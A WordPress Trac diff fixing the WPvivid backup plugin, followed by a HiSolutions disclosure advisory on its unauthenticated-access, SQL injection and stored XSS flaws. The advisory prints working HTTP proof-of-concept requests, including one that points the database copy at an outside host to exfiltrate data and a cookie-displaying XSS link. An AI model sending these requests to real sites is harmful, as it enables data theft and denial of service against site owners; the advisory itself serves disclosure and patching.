  | [r2580249](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2580249#L31 "Show revision 2580249 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2667839#L31 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 31 | 31 | } |
  | 32 | 32 | $this->log\_file\_handle = fopen($this->log\_file, 'a'); |
  | 33 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 33 | $offset=get\_option('gmt\_offset'); |
  |  | 34 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 34 | 35 | $text='Log created: '.$time."\n"; |
  | 35 | 36 | $text.='Type: '.$describe."\n"; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2580249#L62) | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2667839#L63) |  |
  | 62 | 63 | if ($this->log\_file\_handle) |
  | 63 | 64 | { |
  | 64 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 65 | $offset=get\_option('gmt\_offset'); |
  |  | 66 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 65 | 67 | $text='['.$time.']'.'['.$type.']'.$log."\n"; |
  | 66 | 68 | fwrite($this->log\_file\_handle,$text ); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2580249#L158) | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2667839#L160) |  |
  | 158 | 160 | } |
  | 159 | 161 |  |
  | 160 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 162 | $offset=get\_option('gmt\_offset'); |
  |  | 163 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 161 | 164 | $text='['.$time.']'.'[notice]'.$log."\n"; |
  | 162 | 165 | fwrite($this->log\_file\_handle,$text ); |
* ## [wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php")

  | [r2587441](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php?rev=2587441#L150 "Show revision 2587441 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php?rev=2667839#L150 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 150 | 150 | <div class="wpvivid-element-space-bottom"> |
  | 151 | 151 | <input type="text" class="all-options" option="setting" name="staging\_request\_timeout" value="<?php esc\_attr\_e($staging\_request\_timeout); ?>" |
  | 152 |  | placeholder="1~~0~~00" onkeyup="value=value.replace(/\D/g,'')" />ms |
  |  | 152 | placeholder="1500" onkeyup="value=value.replace(/\D/g,'')" />ms |
  | 153 | 153 | </div> |
  | 154 | 154 | <div class="wpvivid-element-space-bottom"> |
  | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php?rev=2587441#L329) | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php?rev=2667839#L329) |  |
  | 329 | 329 | <div class="wpvivid-element-space-bottom"> |
  | 330 | 330 | <input type="text" class="all-options" option="setting" name="staging\_request\_timeout" value="<?php esc\_attr\_e($staging\_request\_timeout); ?>" |
  | 331 |  | placeholder="1~~0~~00" onkeyup="value=value.replace(/\D/g,'')" />ms |
  |  | 331 | placeholder="1500" onkeyup="value=value.replace(/\D/g,'')" />ms |
  | 332 | 332 | </div> |
  | 333 | 333 | <div class="wpvivid-element-space-bottom"> |
* ## [wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php")

  | [r2653407](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php?rev=2653407#L161 "Show revision 2653407 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php?rev=2667839#L161 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 161 | 161 | { |
  | 162 | 162 | add\_action('wp\_ajax\_wpvividstg\_start\_staging\_free', array($this, 'start\_staging')); |
  | 163 |  | add\_action('wp\_ajax\_nopriv\_wpvividstg\_start\_staging\_free', array($this, 'start\_staging')); |
  |  | 163 | //add\_action('wp\_ajax\_nopriv\_wpvividstg\_start\_staging\_free', array($this, 'start\_staging')); |
  | 164 | 164 | add\_action('wp\_ajax\_wpvividstg\_set\_restart\_staging\_id\_free', array($this, 'set\_restart\_staging\_id')); |
  | 165 | 165 | add\_action('wp\_ajax\_wpvividstg\_get\_staging\_progress\_free', array($this, 'get\_staging\_progress')); |
  | 166 |  | add\_action('wp\_ajax\_nopriv\_wpvividstg\_get\_staging\_progress\_free', array($this, 'get\_staging\_progress')); |
  |  | 166 | //add\_action('wp\_ajax\_nopriv\_wpvividstg\_get\_staging\_progress\_free', array($this, 'get\_staging\_progress')); |
  | 167 | 167 | add\_action('wp\_ajax\_wpvividstg\_delete\_site\_free', array($this, 'delete\_site')); |
  | 168 | 168 | add\_action('wp\_ajax\_wpvividstg\_delete\_cancel\_staging\_site\_free', array($this, 'delete\_cancel\_staging\_site')); |
* ## [wpvivid-backuprestore/trunk/wpvivid-backuprestore.php](/changeset/2667839/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/wpvivid-backuprestore.php")

  | [r2661194](/browser/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php?rev=2661194#L8 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php?rev=2667839#L8 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 8 | 8 | \* Plugin Name:       WPvivid Backup Plugin |
  | 9 | 9 | \* Description:       Clone or copy WP sites then move or migrate them to new host (new domain), schedule backups, transfer backups to leading remote storage. All in one. |
  | 10 |  | \* Version:           0.9.6~~8~~ |
  |  | 10 | \* Version:           0.9.69 |
  | 11 | 11 | \* Author:            WPvivid Team |
  | 12 | 12 | \* Author URI:        https://wpvivid.com |
  | […](/browser/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php?rev=2661194#L22) | […](/browser/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php?rev=2667839#L22) |  |
  | 22 | 22 | } |
  | 23 | 23 |  |
  | 24 |  | define( 'WPVIVID\_PLUGIN\_VERSION', '0.9.6~~8~~' ); |
  |  | 24 | define( 'WPVIVID\_PLUGIN\_VERSION', '0.9.69' ); |
  | 25 | 25 | // |
  | 26 | 26 | define('WPVIVID\_RESTORE\_INIT','init'); |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2667839)
* [Zip Archive](?format=zip&new=2667839)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from research.hisolutions.com_55a58500_20250110_130441.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Multiple vulnerabilities in WordPress Plugin – WPvivid Backup and Migration

Von [David Mathiszik](https://research.hisolutions.com/author/davidm/)[8. Januar 202429. Februar 2024](https://research.hisolutions.com/2024/01/multiple-vulnerabilities-in-wordpress-plugin-wpvivid-backup-and-migration/)[Advisories](https://research.hisolutions.com/category/advisories/), [Allgemein](https://research.hisolutions.com/category/allgemein/), [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)

As part of a customer project, multiple vulnerabilities in the WordPress plugin [WPvivid Backup and Migration](https://wordpress.org/plugins/wpvivid-backuprestore/) (Free Edition) were identified and further investigated outside the project to determine the impact in more detail.

The vulnerabilities were identified in version 0.9.68 and probably exist in older versions as well. Upgrade the plugin WPvivid [Backup](https://research.hisolutions.com/2023/04/reddit-ausfall-nicht-nur-systeme-sondern-auch-die-menschen-aktuell-halten/) and Migration (Free Edition) to the version 0.9.69 or higher as soon as possible to fix the vulnerabilities.

## Background Information

[WPvivid Backup and Migration](https://wordpress.org/plugins/wpvivid-backuprestore/) is a WordPress plugin by [WPvivid Team](https://wpvivid.com/) and offers backup, migration, and staging as basic features. This plugin has more than 200,000 active installations.

## The vulnerabilities

Functions of the WPvivid Backup and Migration plugin in version 0.9.68 can be called remotely without authentication, which allows attackers to exfiltrate the entire WordPress database, for example, or to fill the hard disk of the corresponding system by multiple local copies of the WordPress pages disturbing their availability ([CVE-2024-1982](https://www.cve.org/CVERecord?id=CVE-2024-1982)).

Furthermore, SQL queries can be manipulated (SQL injection), which means that further database contents can probably be read or manipulated without authentication ([CVE-2024-1981](https://www.cve.org/CVERecord?id=CVE-2024-1981)).

The plugin is also vulnerable to stored cross-site scripting attacks . For this, a WordPress administrator must execute a manipulated link, for example. This vulnerability was simultaneously published by another researcher and is already tracked under [CVE-2021-24994](https://www.cve.org/CVERecord?id=CVE-2021-24994).

## Unauthenticated Access to WPvivid Functions (CVE-2024-1982)

The following plugin functions can be called unauthenticated e. g. over the Internet:

* `wp_ajax_nopriv_wpvivid_restore`
* `wp_ajax_nopriv_wpvivid_get_restore_progress`
* `wp_ajax_nopriv_wpvividstg_start_staging_free`
* `wp_ajax_nopriv_wpvividstg_get_staging_progress_free`

The function `wp_ajax_nopriv_wpvividstg_start_staging_free` can be used to trigger the creation of a staging web page. Selected or all files of the WordPress installation are copied into a definable subdirectory. This functionality can be started without prior authentication like this:

```
POST /wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: myblog.hisocorp.com
[…]
Content-Type: application/x-www-form-urlencoded

path=custom_name_staging_page&table_prefix=something&custom_dir=something&additional_db={"test":"test"}&root_dir=0
```

Afterwards, the server response `{"result":"success","task_id":"wpvivid-61ba042730a63"}` indicates that the action was successful.

By continuously running this function to create staging versions of the web application an attacker can exhaust the systems disk space. Normal operation of the system and especially of the web application can thus no longer be provided.

By specifying a remote system in the parameters of the function `wp_ajax_nopriv_wpvividstg_start_staging_free`, the contents of the WordPress installation can be exfiltrated. This can be done as in the following example request:

```
POST /wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: example.org
[…]
Content-Type: application/x-www-form-urlencoded

path=name_existing_staging_page&create_new_wp=1&additional_db={"additional_database_check":"1","additional_database_info":{"db_host":"192.168.0.5","db_name":"something","db_user":"username","db_pass":"password"}}&custom_dir={"database_check":1}&table_prefix=something
```

Afterwards, the status must be queried once via the function `wpvividstg_get_staging_progress_free`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_get_staging_progress_free HTTP/1.1
Host: myblog.hisocorp.com
Content-Type: application/x-www-form-urlencoded
```

Thus, an attacker can retrieve sensitive data from WordPress databases.

**Update:** The vendor fix in version 0.9.69 simply disables the `wpvividstg_start_staging_free` action, see code changes to `includes/staging/class-wpvivid-staging.php` [here](https://plugins.trac.wordpress.org/changeset?old_path=%2Fwpvivid-backuprestore%2Ftrunk&old=2667839&new_path=%2Fwpvivid-backuprestore%2Ftrunk&new=2667839&sfp_email=&sfph_mail=).

## SQL Injection in WPvivid Function (CVE-2024-1981)

The parameter `table_prefix` in the function `wpvividstg_start_staging_progress_free` appears to be vulnerable to an SQL injection. However, no more in-depth exploitability was performed as part of the research.

The following HTTP request was sent to the plugin function with the parameter value `test'`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_start_staging_free HTTP/1.1
Host: myblog.hisocorp.com
[…]
Content-Type: application/x-www-form-urlencoded

path=something&additional_db={"test":"test"}&custom_dir={"database_check":1}&table_prefix=test'

```

Subsequently, the status must be queried once via the function `wpvividstg_get_staging_progress_free`:

```
POST /wordpress/wp-admin/admin-ajax.php?action=wpvividstg_get_staging_progress_free HTTP/1.1
Host: myblog.hisocorp.com
Content-Type: application/x-www-form-urlencoded

```

It may happen that the status has to be queried several times until the following response containing the SQL exception is returned:

```
{"continue":0,"error":1,"error_msg":"Failed to create a table. Error:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '` (\n  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `comment_id` b...' at line 1, query:CREATE TABLE `test'commentmeta` (\n  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `comment_id` bigint(20) unsigned NOT NULL DEFAULT 0,\n  `meta_key` varchar(255) DEFAULT NULL,\n  `meta_value` longtext DEFAULT NULL,\n  PRIMARY KEY (`meta_id`),\n  KEY `comment_id` (`comment_id`),\n  KEY `meta_key` (`meta_key`(191))\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4","log":"open log file failed","percent":50,"result":"success"}
```

**Update:** Here, the vendor fix in version 0.9.69 is the same as for the previous vulnerability. The `wpvividstg_get_staging_progress_free` action was simply disabled by commenting it out in `includes/staging/class-wpvivid-staging.php`, see [here](https://plugins.trac.wordpress.org/changeset?old_path=%2Fwpvivid-backuprestore%2Ftrunk&old=2667839&new_path=%2Fwpvivid-backuprestore%2Ftrunk&new=2667839&sfp_email=&sfph_mail=).

## Stored Cross Site Scripting (XSS) in WPvivid

**Update:** This vulnerability was also independently discovered and reported by another researcher and was assigned CVE-2021-24994 (published during the [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) process, see [here](https://wpscan.com/vulnerability/ea74257a-f6b0-49e9-a81f-53c0eb81b1da/)).

The plugin offers remote storage on a Google Drive. For this, an account (called Google Drive Remote Storage Account) for the corresponding authentication must be provided. The name of the specified account is included partially unfiltered in an onclick JavaScript area within the plugin. This means that arbitrary HTML and JavaScript code can be injected. This behavior allows stored [XSS](https://research.hisolutions.com/2023/04/xss-auf-abwegen/) attacks via the plugin web interface.

When a logged in WordPress administrator executes the following link, an account with the specified name is automatically stored in the plugin:

```
http://myblog.hisocorp.com/wp-admin/admin.php?page=WPvivid&action=wpvivid_google_drive_finish_auth&name=test2%22%20onload%3dalert(document.cookie)%3E&default=lll%27%22lll&auth_id
```

The payload passed in this example adds the JavaScript attribute `onload`, which is used to display the session cookies in an alert box:

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/01/poc.jpg)
## Responsible Disclosure Timeline

* 15.12.2021 – HiSolutions identified the vulnerabilities
* 14.01.2022 – HiSolutions contaced WPvivid Team via contact form
* 20.01.2022 – WPvivid Team responds and HiSolutions sends the details regarding the vulnerabilities
* 14.02.2022 – WPvivid Team provides the new version 0.9.69 in which the vulnerabilities should be fixed
* 01.03.2022 – HiSolutions tests the new version. The vulnerabilities were fixed.
* 29.02.2024 – The Wordfence CNA issues [CVE-2024-1981](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/wpvivid-backup-and-migration-0968-unauthenticated-sql-injection) and [CVE-2024-1982](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/wpvivid-backup-and-migration-0968-missing-authorization).
## Credits

The vulnerabilities were found by Denis Werner (HiSolutions AG). The fixes were reviewed by David Mathiszik (HiSolutions AG).

## Autoren

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
  [Alle Beiträge ansehen](https://research.hisolutions.com/author/davidm/ "Alle Beiträge ansehen")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")

  Advisories/Disclosure

  [Alle Beiträge ansehen](https://research.hisolutions.com/author/denisw/ "Alle Beiträge ansehen")

## Beitragsnavigation

[M365 – nicht der richtige Deckel für jeden Topf](https://research.hisolutions.com/2024/01/m365-nicht-der-richtige-deckel-fuer-jeden-topf/)[Seitenkanal des Monats: Ein Auto](https://research.hisolutions.com/2024/01/seitenkanal-des-monats-ein-auto/)

* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024
* [Kleine Wortänderung mit großer Wirkung – NIST-Passwortrichtlinie](https://research.hisolutions.com/2024/10/kleine-wortaenderung-mit-grosser-wirkung-nist-passwortrichtlinie/)17. Oktober 2024
* [Tor-Browser geknackt: Die Zwiebel hat eine Schale verloren!](https://research.hisolutions.com/2024/10/tor-browser-geknackt-die-zwiebel-hat-eine-schale-verloren/)17. Oktober 2024
* [perfctl – kein Administrationswerkzeug, sondern Malware](https://research.hisolutions.com/2024/10/perfctl-kein-administrationswerkzeug-sondern-malware/)17. Oktober 2024
* [Wenn der extra eingekaufte Zugangsverwalter umgangen werden kann](https://research.hisolutions.com/2024/10/wenn-der-extra-eingekaufte-zugangsverwalter-umgangen-werden-kann/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (71)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (389)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (114)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (25)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2023/09/Franz-Glaeser_ORIGINAL-150x150.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
